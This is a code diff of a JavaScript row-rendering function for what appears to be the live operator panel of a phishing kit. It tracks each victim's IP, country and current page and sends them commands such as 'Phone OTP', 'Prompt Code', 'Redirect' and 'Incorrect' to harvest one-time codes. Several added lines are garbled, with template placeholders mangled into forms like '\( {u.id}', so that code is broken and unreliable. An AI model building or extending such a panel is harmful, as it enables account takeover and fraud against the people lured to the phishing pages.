@@ -284,7 +284,7 @@
   function createNewUserRow(u, viewMode) {
     const code = normalizeCode(u.country);
     const country = countryData.find(c => c.code === code);
-    const flag = country ? `<img src="${country.image}" alt="${country.code}" width="20" title="${country.name}" />`: "❓";
+    const flag = country ? `<img src="\( {country.image}" alt=" \){country.code}" width="20" title="${country.name}" />` : "❓";
 
     const cleanPage = (u.page || "").replace(/\//g, "").toLowerCase();
 
@@ -300,78 +300,76 @@
     const row = document.createElement("tr");
 
     if (viewMode === "all") {
-      const isBlocked = u.status === "blocked";
-      const blockBtnLabel = isBlocked ? "Unblock" : "Block";
-      const blockBtnColor = isBlocked ? "red" : "#222";
+        const isBlocked = u.status === "blocked";
+        const blockBtnLabel = isBlocked ? "Unblock" : "Block";
+        const blockBtnColor = isBlocked ? "red" : "#222";
 
-      row.innerHTML = `
-        <td>${u.identifier || u.id}</td>
-        <td id="status-\( {u.id}" style="color: \){isBlocked ? 'red' : 'inherit'};font-weight:${isBlocked ? 'bold' : 'normal'};">
-          ${u.status}
-        </td>
-        <td>${u.ip || "—"}</td>
-        <td>${flag}</td>
-        <td>${u.last_seen || "—"}</td>
-        <td id="userpage-${u.id}">${u.screen || u.page || "—"}</td>
-        <td id="misc-${u.id}"></td>
-        <td style="text-align:center;">
-          <button class="delete-btn" data-id="\( {u.id}" id="deletebtn- \){u.id}" onclick="deleteUser('${u.id}')"
-            style="background:#d33;color:white;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;">
-            Delete
-          </button> 
-          <div style="margin-top:5px;">
-            <button class="block-toggle-btn"
-              data-id="\( {u.id}" id="blockbtn- \){u.id}"
-              data-status="\( {u.status}" onclick="toggleBlockStatus(' \){u.id}', 'all', '${u.status}')"
-              style="background:${blockBtnColor};color:white;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;">
-              ${blockBtnLabel}
-            </button>
-          </div>
-        </td>
-        <td><button onclick="viewInput('${u.id}')">👁️</button></td>
-      `;
+        row.innerHTML = `
+            <td>${u.identifier || u.id}</td>
+            <td id="status-${u.id}" style="color: ${isBlocked ? 'red' : 'inherit'}; font-weight: ${isBlocked ? 'bold' : 'normal'};">
+                ${u.status}
+            </td>
+            <td>${u.ip || "—"}</td>
+            <td>${flag}</td>
+            <td>${u.last_seen || "—"}</td>
+            <td id="userpage-\( {u.id}"> \){u.screen || u.page || "—"}</td>
+            <td id="misc-${u.id}"></td>
+            <td style="text-align:center;">
+                <button class="delete-btn" data-id="\( {u.id}" id="deletebtn- \){u.id}" onclick="deleteUser('${u.id}')"
+                    style="background:#d33;color:white;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;">
+                    Delete
+                </button> 
+                <div style="margin-top:5px;">
+                    <button class="block-toggle-btn" data-id="\( {u.id}" id="blockbtn- \){u.id}"
+                        data-status="\( {u.status}" onclick="toggleBlockStatus(' \){u.id}', 'all', '${u.status}')"
+                        style="background:${blockBtnColor};color:white;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;">
+                        ${blockBtnLabel}
+                    </button>
+                </div>
+            </td>
+            <td><button onclick="viewInput('${u.id}')">👁️</button></td>
+        `;
     } else {
-      // Active mode
-      row.innerHTML = `
-        <td>${u.identifier || u.id}</td>
-        <td id="status-${u.id}">
-          ${u.status === "blocked"
-            ? `<button class="unblock-btn" id="unblock-btn-${u.id}"
-                data-id="\( {u.id}" onclick="toggleBlockStatus(' \){u.id}', 'active', '${u.status}')"
-                style="background:red;color:white;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;">
-                Unblock
-              </button>`
-            : u.status}
-        </td>
-        <td>${u.ip || "—"}</td>
-        <td>${flag}</td>
-        <td>${u.last_seen || "—"}</td>
-        <td id="userpage-${u.id}">${u.screen || u.page || "—"}</td>
-        <td>
-          <input id="ph-otp-${u.id}" type="text" inputmode="numeric"
-            maxlength="4" pattern="[0-9]*"
-            oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,4)"
-            style="display:none; max-width:45px;" placeholder="xxxx">
-          <span id="dot-${u.id}" class="dot" style="display:none;"></span>
-        </td>
-        <td>
-          <select id="cmd-${u.id}" onchange="toggleOtpInput('${u.id}')">
-              <option value="">Command</option>
-              ${incorrectOption}
-              <option value="refresh">Refresh</option>
-              <option value="nextpage">Next</option>
-              <option value="redirect">Redirect</option>
-              <option value="phone-otp">Phone OTP</option>
-              <option value="prompt">Prompt Code</option>
-            </select>
-            <button onclick="sendCommand('${u.id}')">Send</button>
-          </td>
-        <td><button onclick="viewInput('${u.id}')">👁️</button></td>
-      `;
+        // Active mode
+        row.innerHTML = `
+            <td>${u.identifier || u.id}</td>
+            <td id="status-${u.id}">
+                ${u.status === "blocked" 
+                    ? `<button class="unblock-btn" id="unblock-btn-\( {u.id}" data-id=" \){u.id}" 
+                        onclick="toggleBlockStatus('\( {u.id}', 'active', ' \){u.status}')" 
+                        style="background:red;color:white;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;">
+                        Unblock
+                      </button>`
+                    : u.status}
+            </td>
+            <td>${u.ip || "—"}</td>
+            <td>${flag}</td>
+            <td>${u.last_seen || "—"}</td>
+            <td id="userpage-\( {u.id}"> \){u.screen || u.page || "—"}</td>
+            <td>
+                <input id="ph-otp-${u.id}" type="text" inputmode="numeric" maxlength="4" 
+                    pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,4)"
+                    style="display:none; max-width:45px;" placeholder="xxxx">
+                <span id="dot-${u.id}" class="dot" style="display:none;"></span>
+            </td>
+            <td>
+                <select id="cmd-\( {u.id}" onchange="toggleOtpInput(' \){u.id}')">
+                    <option value="">Command</option>
+                    ${incorrectOption}
+                    <option value="refresh">Refresh</option>
+                    <option value="nextpage">Next</option>
+                    <option value="redirect">Redirect</option>
+                    <option value="phone-otp">Phone OTP</option>
+                    <option value="prompt">Prompt Code</option>
+                </select>
+                <button onclick="sendCommand('${u.id}')">Send</button>
+            </td>
+            <td><button onclick="viewInput('${u.id}')">👁️</button></td>
+        `;
     }
 
     return row;
-  }
+}
 
   function updateRowContent(row, u, viewMode) {
     // Update status cell
